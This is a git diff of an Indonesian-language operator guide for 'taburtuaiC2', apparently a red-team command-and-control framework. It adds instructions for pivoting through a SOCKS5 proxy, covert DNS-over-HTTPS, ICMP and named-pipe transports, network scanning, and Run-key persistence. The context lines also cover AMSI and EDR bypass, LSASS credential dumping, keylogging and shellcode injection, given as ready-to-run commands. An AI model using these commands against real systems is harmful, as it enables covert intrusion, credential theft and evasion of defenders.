@@ -11,18 +11,24 @@
 3. [Build Implant (Agent)](#3-build-implant-agent)
 4. [Menjalankan Server](#4-menjalankan-server)
 5. [Menjalankan Operator Console](#5-menjalankan-operator-console)
-6. [Fitur Dasar](#6-fitur-dasar)
-7. [Level 2 — Injection & Evasion](#7-level-2--injection--evasion)
-8. [Phase 3 — EDR Bypass](#8-phase-3--edr-bypass)
-9. [Phase 4 — Advanced Injection](#9-phase-4--advanced-injection)
-10. [Phase 5 — Credential Access](#10-phase-5--credential-access)
-11. [Phase 6 — Sleep Obfuscation](#11-phase-6--sleep-obfuscation)
-12. [Phase 7 — NTDLL Unhooking](#12-phase-7--ntdll-unhooking)
-13. [Phase 8 — Hardware Breakpoints](#13-phase-8--hardware-breakpoints)
-14. [Phase 9 — BOF Execution](#14-phase-9--bof-execution)
-15. [Phase 10 — OPSEC](#15-phase-10--opsec)
-16. [OPSEC Profiles](#16-opsec-profiles)
-17. [Troubleshooting](#17-troubleshooting)
+6. [Web Dashboard](#6-web-dashboard)
+7. [Enkripsi — Two-Phase (Bootstrap + ECDH Session)](#7-enkripsi--two-phase-bootstrap--ecdh-session)
+8. [Team Server — Multi-Operator](#8-team-server--multi-operator)
+9. [Fitur Dasar](#9-fitur-dasar)
+10. [Injection & Evasion](#10-injection--evasion)
+11. [EDR Bypass](#11-edr-bypass)
+12. [Advanced Injection](#12-advanced-injection)
+13. [Credential Access](#13-credential-access)
+14. [Sleep Obfuscation](#14-sleep-obfuscation)
+15. [NTDLL Unhooking](#15-ntdll-unhooking)
+16. [Hardware Breakpoints (HWBP)](#16-hardware-breakpoints-hwbp)
+17. [BOF Execution](#17-bof-execution)
+18. [OPSEC Checks](#18-opsec-checks)
+19. [Network Recon & Registry](#19-network-recon--registry)
+20. [SOCKS5 Pivot](#20-socks5-pivot)
+21. [Alternative Transports](#21-alternative-transports)
+22. [OPSEC Profiles](#22-opsec-profiles)
+23. [Troubleshooting](#23-troubleshooting)
 
 ---
 
@@ -260,7 +266,109 @@ Di dalam console, ketik `help` untuk melihat semua command.
 
 ---
 
-## 6. Fitur Dasar
+## 6. Web Dashboard
+
+Dashboard tersedia di `http://<host>:<port>/` begitu server berjalan. Ini adalah Vue 3 SPA yang berkomunikasi langsung dengan API.
+
+### Halaman yang tersedia
+
+| Halaman | URL | Deskripsi |
+|---------|-----|-----------|
+| Overview | `/` | Statistik server, agent online/dormant/offline, command queue |
+| Agents | `/agents` | Daftar semua agent + detail (OS, hostname, IP, last-seen) |
+| Command History | `/commands` | Semua command beserta status dan output |
+| Logs | `/logs` | Server logs realtime |
+| Staged Payloads | `/payloads` | Manajemen payload yang di-stage untuk eksekusi |
+| Team Server | `/team` | Operator sessions, agent claims, broadcast events |
+
+### Menggunakan dengan API Key
+
+Jika server dijalankan dengan `--auth`, semua request dari dashboard dan operator perlu menyertakan API key. Dashboard otomatis menyimpannya di `localStorage` setelah login pertama.
+
+```bash
+# Server dengan auth
+ENCRYPTION_KEY=yourkey API_KEY=mytoken ./bin/server --port 9000 --auth
+
+# Operator dengan API key
+./bin/operator --server http://192.168.1.10:9000 --api-key mytoken agents list
+```
+
+---
+
+## 7. Enkripsi — Two-Phase (Bootstrap + ECDH Session)
+
+taburtuaiC2 menggunakan dua lapisan enkripsi:
+
+### Phase 1 — Bootstrap (Static Key)
+
+Saat agent pertama kali check-in, komunikasi dienkripsi menggunakan **AES-256-GCM** dengan key statis yang di-bake saat build (`--key` flag). Di fase ini agent mengirimkan ECDH public key-nya ke server.
+
+### Phase 2 — ECDH Session Key
+
+Server menghasilkan ephemeral ECDH P-256 key pair, menghitung shared secret dengan public key agent, lalu menurunkan 32-byte session key via SHA-256:
+
+```
+session_key = SHA-256(shared_secret || "taburtuai-c2-session-v1")
+```
+
+Session key ini disimpan di metadata agent (`_session_key`). **Semua traffic setelah checkin** (commands, results, file transfers) dienkripsi dengan session key ini — bukan static key.
+
+### Implikasi praktis
+
+- Jika server restart, session key hilang (tersimpan di memory/SQLite per-agent). Agent perlu check-in ulang untuk negosiasi key baru.
+- Static key (`ENCRYPTION_KEY`) hanya digunakan untuk bootstrap. Jangan gunakan key yang sama di banyak engagement.
+- Agent menyertakan `agent_id` sebagai plaintext di outer wrapper agar server bisa lookup session key yang tepat tanpa perlu decrypt dulu.
+- Fallback ke static key otomatis terjadi jika session key belum ada (pre-ECDH agent atau agent lama).
+
+### Cara verifikasi enkripsi aktif
+
+```bash
+# Cek di server log — setelah checkin agent, akan ada baris:
+# "ECDH session key established for agent <id>"
+
+# Di agent, session key aktif saat activeCrypto() != nil
+# (terlihat di debug log jika --debug build)
+```
+
+---
+
+## 8. Team Server — Multi-Operator
+
+taburtuaiC2 mendukung multiple operator terhubung ke satu server secara bersamaan.
+
+### Konsep Agent Claim
+
+Untuk mencegah dua operator mengirim command ke agent yang sama secara bersamaan, sistem menggunakan **claim ownership**:
+
+```bash
+# Claim agent (operator A)
+team claim <agent-id>
+
+# Sekarang operator lain yang mencoba cmd execute akan mendapat error:
+# "agent <id> is claimed by <session> — release it first"
+
+# Release agent setelah selesai
+team release <agent-id>
+
+# Lihat semua claims aktif
+team claims
+```
+
+### Session ID
+
+Setiap operator session memiliki UUID unik yang dikirim via header `X-Session-ID`. Operator CLI mengelola ini secara otomatis.
+
+### Broadcast Events
+
+Saat agent mengirim hasil command, semua operator yang terhubung mendapat notifikasi via WebSocket-like event:
+
+```
+[event] result_ready agent=<id> cmd=execute status=completed duration=1.23s
+```
+
+---
+
+## 9. Fitur Dasar
 
 ### Lihat agent yang terhubung
 
@@ -327,7 +435,7 @@ persistence remove <id> --method registry_run --name "WindowsUpdate"
 
 ---
 
-## 7. Level 2 — Injection & Evasion
+## 10. Injection & Evasion
 
 ### Process Injection
 
@@ -404,7 +512,7 @@ ads exec <id> C:\Windows\Temp\legit.txt:payload.js
 
 ---
 
-## 8. Phase 3 — EDR Bypass
+## 11. EDR Bypass
 
 ### AMSI / ETW Bypass
 
@@ -469,7 +577,7 @@ keylog stop <id>
 
 ---
 
-## 9. Phase 4 — Advanced Injection
+## 12. Advanced Injection
 
 > Semua teknik di bawah memerlukan shellcode raw binary (`.bin`).
 > Bisa di-generate dengan msfvenom, Donut, sRDI, dll.
@@ -546,7 +654,7 @@ mapinject <id> --file /tmp/sc.bin --pid 1234 --wait
 
 ---
 
-## 10. Phase 5 — Credential Access
+## 13. Credential Access
 
 ### LSASS Dump
 
@@ -619,7 +727,7 @@ Berguna untuk menangkap password yang baru di-copy, OTP, dsb.
 
 ---
 
-## 11. Phase 6 — Sleep Obfuscation
+## 14. Sleep Obfuscation
 
 Menggunakan XOR untuk mengenkripsi memory region agent selama sleep, sehingga memory scanner tidak bisa membaca payload saat idle.
 
@@ -644,7 +752,7 @@ evasion sleep <id> --duration 30 --wait
 
 ---
 
-## 12. Phase 7 — NTDLL Unhooking
+## 15. NTDLL Unhooking
 
 Menghapus hook yang dipasang EDR di NTDLL dengan cara overwrite section `.text` dengan copy bersih dari disk.
 
@@ -670,7 +778,7 @@ evasion unhook <id> --wait
 
 ---
 
-## 13. Phase 8 — Hardware Breakpoints
+## 16. Hardware Breakpoints (HWBP)
 
 Menggunakan debug registers (DR0-DR3) via VEH (Vectored Exception Handler) sebagai hook mechanism — tanpa menulis ke memory process.
 
@@ -703,7 +811,7 @@ Untuk patchless AMSI bypass via HWBP (tidak menulis ke AmsiScanBuffer):
 
 ---
 
-## 14. Phase 9 — BOF Execution
+## 17. BOF Execution
 
 Menjalankan Beacon Object Files (COFF object files) sepenuhnya in-memory, kompatibel dengan format Cobalt Strike BOF.
 
@@ -761,7 +869,7 @@ with open('/tmp/dir_args.bin', 'wb') as f:
 
 ---
 
-## 15. Phase 10 — OPSEC
+## 18. OPSEC Checks
 
 ### Anti-Debug Check
 
@@ -825,7 +933,136 @@ GOOS=windows GOARCH=amd64 go build \
 
 ---
 
-## 16. OPSEC Profiles
+## 19. Network Recon & Registry
+
+### Network Scan
+
+```bash
+# Scan subnet — temukan host aktif via ICMP/TCP
+recon scan <id> --subnet 192.168.1.0/24
+
+# Scan port tertentu pada range host
+recon scan <id> --subnet 10.0.0.0/16 --ports 22,80,443,445,3389
+
+# Tunggu hasilnya
+recon scan <id> --subnet 192.168.1.0/24 --wait
+```
+
+### ARP Scan (Local Network)
+
+```bash
+# ARP scan — lebih cepat dan silent di LAN
+recon arp <id>
+
+# Output: daftar IP + MAC address yang merespons
+```
+
+### Registry Read/Write
+
+```bash
+# Baca registry key
+registry read <id> HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+# Baca single value
+registry read <id> HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run --value UpdateService
+
+# Tulis value baru
+registry write <id> HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run \
+  --value "MyApp" --data "C:\Windows\Temp\agent.exe" --type REG_SZ
+
+# Hapus value
+registry delete <id> HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run --value "MyApp"
+```
+
+---
+
+## 20. SOCKS5 Pivot
+
+Jalankan SOCKS5 proxy in-process di dalam agent — semua traffic di-tunnel melalui agent ke jaringan internal target.
+
+### Memulai proxy
+
+```bash
+# Start SOCKS5 listener di port default (1080) di sisi operator
+pivot start <id> --port 1080
+
+# Start di port custom
+pivot start <id> --port 9050
+
+# Stop proxy
+pivot stop <id>
+```
+
+### Menggunakan dengan tools
+
+```bash
+# Konfigurasi proxychains
+# /etc/proxychains4.conf:
+# socks5 127.0.0.1 1080
+
+# Scan via pivot
+proxychains nmap -sT -p 22,80,443,445 10.10.10.0/24
+
+# RDP via pivot
+proxychains xfreerdp /u:Administrator /p:Password123 /v:10.10.10.50
+
+# SMB via pivot
+proxychains impacket-smbclient 10.10.10.50
+```
+
+**Catatan:** SOCKS5 in-process menggunakan goroutine per connection. Untuk best performance, batasi concurrent connections. IPv4 dan IPv6 keduanya didukung.
+
+---
+
+## 21. Alternative Transports
+
+Agent mendukung tiga transport alternatif selain HTTP standar. Transport dipilih saat build.
+
+### DNS-over-HTTPS (DoH)
+
+Data dikodekan dalam DNS queries menggunakan Cloudflare/Google DoH — menyatu dengan traffic DNS normal.
+
+```bash
+# Build dengan DoH transport
+./scripts/build/build_agent.sh \
+  --server https://doh.example.com \
+  --transport doh \
+  --os windows --arch amd64
+```
+
+**Cara kerja:** Agent mengkodekan payload dalam subdomain labels, menggunakan DNS TXT record sebagai channel respon. C2 server harus menjalankan DoH-compatible listener.
+
+### ICMP Echo (Covert Channel)
+
+Payload disembunyikan dalam ICMP echo request/reply payload — terlihat sebagai ping traffic normal.
+
+```bash
+# Build dengan ICMP transport
+./scripts/build/build_agent.sh \
+  --server 192.168.1.10 \
+  --transport icmp \
+  --os windows --arch amd64
+```
+
+**Batasan:** Memerlukan elevated privileges (raw socket). Cocok untuk jaringan yang memblokir TCP/UDP tapi mengizinkan ICMP.
+
+### SMB Named Pipe
+
+Komunikasi via named pipe — ideal untuk lateral movement tanpa jaringan eksternal.
+
+```bash
+# Build dengan SMB transport
+./scripts/build/build_agent.sh \
+  --server \\\\dc01\\pipe\\taburtuai \
+  --transport smb \
+  --os windows --arch amd64
+```
+
+**Cara kerja:** Agent membuat atau terhubung ke named pipe. Cocok untuk air-gapped environments atau saat agen di satu host bisa menjadi relay ke agent lain.
+
+---
+
+## 22. OPSEC Profiles
 
 Profile disimpan di `builder/profiles/` dalam format YAML:
 
@@ -866,7 +1103,7 @@ Build dengan profile:
 
 ---
 
-## 17. Troubleshooting
+## 23. Troubleshooting
 
 ### Agent tidak check-in
 
@@ -880,6 +1117,29 @@ ps aux | grep server
 
 # Cek logs server
 ./bin/server --verbose
+```
+
+### Command tidak terenkripsi / "No decryption key available"
+
+Terjadi jika server restart dan session key ECDH hilang, tapi agent masih mencoba mengirim dengan session key lama.
+
+```bash
+# Solusi: hapus agent dari server agar check-in ulang (re-negosiasi ECDH)
+./bin/operator --server http://... agents delete <agent-id>
+
+# Agent akan check-in ulang pada beacon berikutnya dan mendapat session key baru
+```
+
+### "agent is claimed by <session> — release it first"
+
+Operator lain sedang memegang claim pada agent tersebut.
+
+```bash
+# Lihat claims aktif
+team claims
+
+# Minta operator yang bersangkutan release, atau admin force-release:
+team release <agent-id> --force
 ```
 
 ### Build error: "cgo: C compiler not found"
@@ -957,6 +1217,11 @@ Keylogger berbasis polling (10ms interval). Di VM atau RDP session, bisa ada del
 > agents info <id>
 > shell <id>
 
+# ── Team server ────────────────────────────────────────────────────
+team claim <id>             # Claim agent (block other operators)
+team release <id>           # Release agent
+team claims                 # List all active claims
+
 # ── OPSEC first ────────────────────────────────────────────────────
 evasion unhook <id> --wait          # Remove EDR hooks
 bypass amsi <id> --wait             # Patch AMSI
@@ -968,6 +1233,9 @@ opsec antivm <id>                   # Verify not VM
 screenshot <id> --save /tmp/ss.png
 keylog start <id> --duration 120
 keylog dump <id>
+recon scan <id> --subnet 192.168.1.0/24
+recon arp <id>
+registry read <id> HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 
 # ── Privilege escalation ───────────────────────────────────────────
 token list <id>
@@ -983,6 +1251,10 @@ creds clipboard <id>
 token make <id> --user Admin --domain CORP --pass "P@ss"
 inject ppid <id> C:\Windows\System32\cmd.exe --ppid-name explorer.exe
 
+# ── Pivot ──────────────────────────────────────────────────────────
+pivot start <id> --port 1080        # SOCKS5 in-process proxy
+# proxychains nmap -sT 10.10.10.0/24
+
 # ── Injection (stealthiest first) ──────────────────────────────────
 mapinject <id> --file sc.bin --pid <pid>   # No WriteProcessMemory
 hollow <id> --file sc.bin                   # New suspended process
@@ -996,4 +1268,5 @@ bof <id> sc_query.o --wait
 # ── Cleanup ────────────────────────────────────────────────────────
 token revert <id>
 persistence remove <id> --method registry_run --name "WinUpdate"
+pivot stop <id>
 ```
